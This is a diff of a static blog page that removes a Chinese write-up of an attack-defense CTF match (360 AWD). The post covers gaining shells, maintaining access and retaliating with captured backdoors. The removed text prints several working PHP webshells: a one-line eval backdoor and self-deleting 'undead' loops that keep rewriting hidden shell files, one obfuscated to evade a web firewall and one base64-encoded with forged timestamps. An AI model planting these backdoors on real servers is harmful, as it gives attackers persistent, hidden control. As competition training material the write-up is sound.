@@ -170,32 +170,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="360AWD赛后总结（攻击方向）"><a href="#360AWD赛后总结（攻击方向）" class="headerlink" title="360AWD赛后总结（攻击方向）"></a>360AWD赛后总结（攻击方向）</h1><h2 id="0X01-什么是AWD"><a href="#0X01-什么是AWD" class="headerlink" title="0X01 什么是AWD"></a>0X01 什么是AWD</h2><blockquote>
-<p>&nbsp;  &nbsp; 在攻防模式中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来得分（当然有的比赛在防御上不设置得分，防御只能避免丢分）。攻防模式 CTF 赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力，同时也比团队之间的分工配合与合作。<br><br> &nbsp;&nbsp; 我们需要利用漏洞获取目标机的权限然后提交flag，然后的步骤是维持权限，保持后门。<br></p>
-</blockquote>
-<h2 id="0X02-前期攻击"><a href="#0X02-前期攻击" class="headerlink" title="0X02 前期攻击"></a>0X02 前期攻击</h2><blockquote>
-<p>&nbsp;&nbsp;在比赛的开始阶段，因为大家的服务器配置相同，可以利用弱密码加上批量脚本连接服务器然后更改目标机的ssh密码进行攻击。（该方法成功性较低，大家第一步就是更改密码）<br><br>&nbsp;&nbsp;除了上面的攻击手法，较为通用的是，在连接上自己的服务器后把自己的WEB应用做一个备份，然后利用漏洞检测工具或者代码审计工具（例如D盾）先进行一遍扫描，找到便于利用的漏洞进行攻击。一般比赛环境中都会在应用服务上留有一些常见的漏洞（例如上传漏洞），更有的会直接留有一个一句话的后门（本次比赛就是）.除了利用扫描工具外，还可以自己分析源码，查看相应CMS的版本漏洞等。<br><br>&nbsp;&nbsp;在找到可以利用的漏洞后，利用漏洞拿shell，上传后门到服务器。<br><br>&nbsp;&nbsp; 在前期还应该扫描IP地址找到目标机所在网段，以及开放的端口服务。</p>
-</blockquote>
-<h2 id="0X03-中期上传后门以及权限维持"><a href="#0X03-中期上传后门以及权限维持" class="headerlink" title="0X03 中期上传后门以及权限维持"></a>0X03 中期上传后门以及权限维持</h2><blockquote>
-<p>&nbsp;&nbsp;在利用漏洞成功拿到shell后利用工具上传木马用于权限维持。上传木马位置一定要隐蔽，不用在uoload的目录下。常见的PHP木马：<br><br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">"YZQ"</span>]); <span class="comment">//一句话木马</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'./.index.php'</span>; <span class="comment">//.index隐藏文件名</span></span><br><span class="line">$code = <span class="string">'&lt;?php @eval($_POST["YZQ"]);?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">	file_put_contents($file,$code);</span><br><span class="line">	usleep(<span class="number">5000</span>);</span><br><span class="line">  <span class="comment">//不死一句话 ，停止服务后才可以删除</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'./.index2.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php  $sF="PCT4BA6ODSE_";$sT="GET";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sT[0].$sT[1].$sT[2])&#125;["n985de9"];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">	file_put_contents($file,$code);</span><br><span class="line">	usleep(<span class="number">5000</span>);</span><br><span class="line">&#125;<span class="comment">//混淆不死马过安全狗</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"> $file = <span class="string">'.config.php'</span>;</span><br><span class="line">$code=base64_decode(<span class="string">'PD9waHAgIGlmKG1kNSgkX1BPU1RbJ3Bhc3MnXSk9PT0nNTkyZDE1NWM1MjBjYWM3NTJmN2UxOWQ0NmE4MDVkNzInKSAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ICA/Pg=='</span>);</span><br><span class="line"> <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span>(md5(file_get_contents($file))!==md5($code)) &#123;</span><br><span class="line">     file_put_contents($file, $code);</span><br><span class="line">     &#125;</span><br><span class="line">  system(<span class="string">'chmod 777 .config.php'</span>);</span><br><span class="line">  touch(<span class="string">".config.php"</span>,mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">2016</span>));</span><br><span class="line">  usleep(<span class="number">100</span>);</span><br><span class="line">&#125; <span class="comment">//base64混淆不死马</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>除了上述的木马还有很多比如用MD5混淆的还有写入head头的 。<br><br>在权限维持的时候可以写入不死马，或者在多个文件目录下写入不死马，可以编写脚本在目录下递归的形式写入不死马。同时为了防止目标机重启服务或者删除不死马，不能仅限一种攻击方式，也要尝试其他攻击方法拿shell。在自己的服务器被中马后，其他人也可能被中，可以利用这个木马的配置和密码进行反打。<br></p>
-<h2 id="0X04-后期的维护"><a href="#0X04-后期的维护" class="headerlink" title="0X04 后期的维护"></a>0X04 后期的维护</h2><p> &nbsp;&nbsp;在后期的比赛阶段，要充分维持已有的靶机，并且利用漏洞挖掘攻克其他没有权限的目标机。在最后的阶段最重要的是心态平和，不要慌。</p>
-<h2 id="0X05-失误与总结"><a href="#0X05-失误与总结" class="headerlink" title="0X05 失误与总结"></a>0X05 失误与总结</h2><blockquote>
-<p>在本次比赛中前期利用挖掘漏洞的优势控制了大部分目标机，但是没有做好权限维持，上传的木马放在了unload这样的明显目录下，另外的失误之处是没有利用好脚本，批量利用脚本没有利用好，所以浪费了大量精力来手工提交，没有使时间去挖掘其他漏洞，没做好当前漏洞失效的后的解决方案。<br><br>继续学习的地方：<br></p>
-<ul>
-<li>脚本编写能力，完成批量脚本的编写</li>
-<li>熟练掌握常见的漏洞挖掘以及利用</li>
-<li>做好充分的准备，脚本以及工具</li>
-<li>熟悉常见CMS的漏洞，有重大影响的CVE</li>
-<li>有一个平和的心态，不要慌<img src="/2018/06/10/AWD攻击总结/1.jpg">  
-</li>
-</ul>
-</blockquote>
-
+        <h1 id="360AWD赛后总结（攻击方向）"><a href="#360AWD赛后总结（攻击方向）" class="headerlink" title="360AWD赛后总结（攻击方向）"></a>360AWD赛后总结（攻击方向）</h1>
+        
+          <a class="article-more-a" href="/2018/06/10/AWD攻击总结/#more">more >></a>
+        
       
 
       
@@ -604,11 +582,7 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">AWD</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -624,7 +598,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color4">AWD</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
             
             <div class="clearfix"></div>
